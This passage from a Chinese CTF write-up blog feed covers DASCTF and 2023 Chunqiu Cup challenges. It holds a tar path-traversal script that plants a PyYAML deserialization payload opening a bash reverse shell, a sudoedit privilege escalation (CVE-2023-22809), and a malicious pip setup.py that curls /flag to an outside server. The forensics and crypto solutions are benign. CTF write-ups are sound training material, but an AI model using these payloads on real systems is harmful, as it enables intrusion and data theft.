class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>开始一个上传点，根据源码知 <code>upload</code> 路由知当上传tar后缀的文件时，回执行解压代码，将文件解压到uploads目录下，利用tar目录穿越漏洞，将文件解压到config目录下，配合下一步 <code>src</code> 路由功能中存在的PyYAML漏洞（CVE-2020-1747），实现RCE。</p><p>生成tar文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">tar = tarfile.TarFile(<span class="string">r&#x27;1.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info = tarfile.TarInfo(<span class="string">&quot;../../config/my.yaml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">deserialization_payload = <span class="string">&quot;&quot;&quot;!!python/object/apply:os.system [&#x27;bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">info.size=<span class="built_in">len</span>(deserialization_payload)</span><br><span class="line">info.mode=<span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">tar.addfile(info, io.BytesIO(deserialization_payload.encode()))</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>上传，回显解压到 <code>../../config/my.yaml</code>，<code>my.yaml</code> 已在config目录下，再访问 <code>/src?username=my</code> 反弹shell成功，执行 <code>cat /fllaagg_here</code> 得到flag：<code>DASCTF&#123;13247551631744504376506324559899&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h3><blockquote><p>Let’s Go!! </p></blockquote><p>go语言程序，找到最后比较的base64密文为：</p><p><code>cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/=</code></p><p>动调加密函数 <code>fkReverse_()</code> ，在码表变量 <code>fkReverse</code> 处下断点，调试得实际码表：</p><p><code>LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK</code></p><p>base64解密得flag：<code>DASCTF&#123;73913519-A0A6-5575-0F10-DDCBF50FA8CA&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;竞赛时间&lt;/p&gt;
&lt;p&gt;2023-09-02 09:00:00~2023-09-03 09:00:00&lt;/p&gt;
&lt;p&gt;竞赛简介&lt;/p&gt;
&lt;p&gt;目前我国网民规模已突破9亿，成为名副其实的网络大国，但我国与网络强国相比还有一定距离。习近平总书记指出：要</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023年春秋杯网络安全联赛 春季赛</title>
    <link href="https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/</id>
    <published>2023-05-19T10:13:55.000Z</published>
    <updated>2023-06-04T16:24:22.895Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2023年春秋杯网络安全联赛春季赛，将更加深化人才培养的意义，给予新生代选手更大的舞台，本次比赛特将时长延长至7天，相对于以往的比赛，这是一次前所未有的尝试。同时，赛题难度分布更加合理均衡，题目质量依旧值得让人期待。题目设计涵盖了多个方面的安全技术，赛题考题范围包括Web 漏洞与渗透(Web)，软件逆向 (Reverse Engineering)，二进制漏洞挖掘和利用(PWN)，密码学（crypto），与杂项（Misc）五大类型，且每个方向每天各放一道题目（第七天不放题）。同时我们还加入了彩蛋题目，希望各位参赛选手玩的开心，在比赛中可以有所收获，希望通过春秋杯能够让各位感受到比赛的乐趣以及春秋GAME的用心，欢迎各位师傅前来挑战。为使比赛更纯粹，更公平，更高质量，我们取消了奖金奖励，并配备了五大方向的高质量赛题。没有名利，更加公平，充分考察选手的综合能力。</p><p><strong>Rank: 13</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><blockquote><p>小楠楠是一个热爱技术的小姑娘，最近开始学习Linux系统中的sudo命令，希望能够更好地管理系统。然而，她并不知道在使用sudo时存在着潜在的网络安全隐患，这可能会给系统带来不必要的风险。因此，她决定进一步学习有关网络安全的知识，以更好地保护系统和数据的安全。小楠楠相信，只有不断学习和提高自己的技能，才能成为一名真正的技术专家。</p></blockquote><p>ssh连接上，发现根目录下有flag，但需要root权限，根据题目描述应该为sudo提权，参考 <a href="https://blog.csdn.net/weixin_46944519/article/details/129971508">【权限提升】Linux Sudo权限提升漏洞(CVE-2023-22809)</a>。</p><p><code>sudo -l</code> 查看NOPASSWD特殊权限（对应 <code>/etc/sudoer.d</code> 文件）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for xiaonannan on engine-1:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User xiaonannan may run the following commands on engine-1:</span><br><span class="line">    (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB</span><br></pre></td></tr></table></figure><p>故 <code>/etc/GAMELAB</code> 有特殊权限，而环境无vim有nano，尝试payload：</p><p><code>EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB</code></p><p>即可在nano编辑模式下得到flag。</p><p>​    </p><h3 id="piphack"><a href="#piphack" class="headerlink" title="piphack"></a>piphack</h3><blockquote><p>可以安装任意包的接口，你会怎么利用呢？</p></blockquote><p>给了一个可以安装任意包的接口，寻找到pip相关的提权方法：<a href="https://www.cnblogs.com/zlgxzswjy/p/10245977.html，参照着FakePip的方法制作">https://www.cnblogs.com/zlgxzswjy/p/10245977.html，参照着FakePip的方法制作</a> <code>setup.py</code> 并打包成whl文件放到vps上，但怎么试也没成功反弹shell。</p><p>尝试出用另一种git方法同样可以从库中拉取恶意脚本读取flag。</p><p>在vps上用python搭建服务器：<code>python3 -m http.server 10010</code></p><p>制作恶意脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">os.system(<span class="string">&#x27;curl http://vps-ip:10010?&#x27;</span>+f)</span><br></pre></td></tr></table></figure><p>放到gitee新建的仓库里，再安装任意包的输入出输入：<code>git+https://gitee.com/lazzzaro/test.git</code></p><p>即可运行库里的 <code>setup.py</code>，在vps内可以看到外带的flag：</p><p><img src="/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/image-20230519191149050.png" alt="image-20230519191149050"></p><p>​    </p><h3 id="wordle"><a href="#wordle" class="headerlink" title="wordle"></a>wordle</h3><blockquote><p>做题累了，不如跟小楠楠一起来玩一个wordle游戏，边玩边学英文，一举两得。</p><p>（纯游戏，通关即拿flag）</p></blockquote><p>wordle猜词游戏，6次内猜对一个5字母单词即可拿到flag。送分。</p><p>​    </p><h3 id="happy2forensics"><a href="#happy2forensics" class="headerlink" title="happy2forensics"></a>happy2forensics</h3><blockquote><p>小楠楠明明看到了flag，怎么打开文件却找不到呢?</p></blockquote><p>查看流量包里http对象，导出 <code>secret.rar</code>，解压出 <code>secret.vhdx</code>，是一个bitlocker加密的磁盘。</p><p>根据官方提示捕获源端口为20，目的端口为80的TCP流量，可以获得bitlocker密码：</p><p><code>bitlocker 120483-350966-299189-055297-225478-133463-431684-359403</code></p><p>在回收站找到 <code>flag2.zip</code> 但需要密码。</p><p>将所有小图片拼接得到 <code>password: 856a-a56b6a705653</code>，解压 <code>flag2.zip</code> 得到 <code>flag2:-919c-a140d7054ac5</code>。</p><p>一堆小图片中有一个不一样大小的图片 <code>210-1.png</code>，binwalk分解，分解出的jpg的APP1块里藏有另一个 <code>FFD8</code> 头，提取出新的jpg，得到 <code>flag1:f97d5b05-d312-46ac</code>。</p><p>合并，flag：<code>flag&#123;f97d5b05-d312-46ac-919c-a140d7054ac5&#125;</code>。</p><p>​    </p><h3 id="盲人隐藏了起来"><a href="#盲人隐藏了起来" class="headerlink" title="盲人隐藏了起来"></a>盲人隐藏了起来</h3><p>12和34做对比，发现12相比34少了38个字节，对照补充字节打开12.mp4，得到压缩包密码：<code>ChunJiSai7k7kbibi@!</code>。</p><p>解压 <code>flag.zip</code> 得到 <code>flag.png</code>，在尾部发现 <code>keyischunqiu123</code>，zsteg查看png图片的lsb，发现在 <code>b1,bgr,lsb,xy</code> 可以直接看到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b1,bgr,lsb,xy       .. &lt;wbStego size=84, ext=&quot;\x00fl&quot;, data=&quot;ag&#123;2c8ba89&quot;..., even=false&gt;</span><br><span class="line">    00000000: 54 00 00 00 66 6c 61 67  7b 32 63 38 62 61 38 39  |T...flag&#123;2c8ba89|</span><br><span class="line">    00000010: 37 2d 30 32 30 35 2d 39  62 66 66 2d 31 32 33 64  |7-0205-9bff-123d|</span><br><span class="line">    00000020: 2d 32 38 31 64 31 32 61  32 34 63 33 38 7d ff ff  |-281d12a24c38&#125;..|</span><br><span class="line">    00000030: ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;2c8ba897-0205-9bff-123d-281d12a24c38&#125;</code>。</p><p>​    </p><h3 id="58与64"><a href="#58与64" class="headerlink" title="58与64"></a>58与64</h3><blockquote><p>好多文件..得想办法把他们弄在一起</p></blockquote><p>14268个txt文件，每个txt文件内保存的为base58结果，解码后再连接成字符串，多次base64解码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14268</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">f&#x27;tmp/<span class="subst">&#123;i&#125;</span>.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readline().strip()</span><br><span class="line">    s += base58.b58decode(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>来签到吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit</span>):</span><br><span class="line">    p, q = [getPrime(nbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = keygen(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">len</span>(flag)//<span class="number">2</span></span><br><span class="line">part1 = bytes_to_long(flag[:t])</span><br><span class="line">part2 = bytes_to_long(flag[t:])</span><br><span class="line"></span><br><span class="line">D = <span class="number">1117</span></span><br><span class="line">x = </span><br><span class="line">y = </span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">enc1 = <span class="built_in">pow</span>(<span class="number">233</span> * n ** <span class="number">2</span> + <span class="number">1</span>, part1, n ** <span class="number">3</span>)</span><br><span class="line">enc2 = <span class="built_in">pow</span>(y * n + <span class="number">1</span>, part2, n ** <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc1 = <span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line"><span class="string">enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line"><span class="string">enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>PELL方程求解+二项式定理应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">enc1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">enc2 = <span class="number">15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">100</span></span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">1117</span></span><br><span class="line">x, y = solve_pell(N)</span><br><span class="line"></span><br><span class="line">flag1 = (enc1 - <span class="number">1</span>) // n**<span class="number">2</span> * inverse_mod(<span class="number">233</span>, n) % n</span><br><span class="line">flag2 = (enc2 % n**<span class="number">2</span> - <span class="number">1</span>) // n * inverse_mod(y, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag1)[<span class="number">2</span>:])+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag2)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 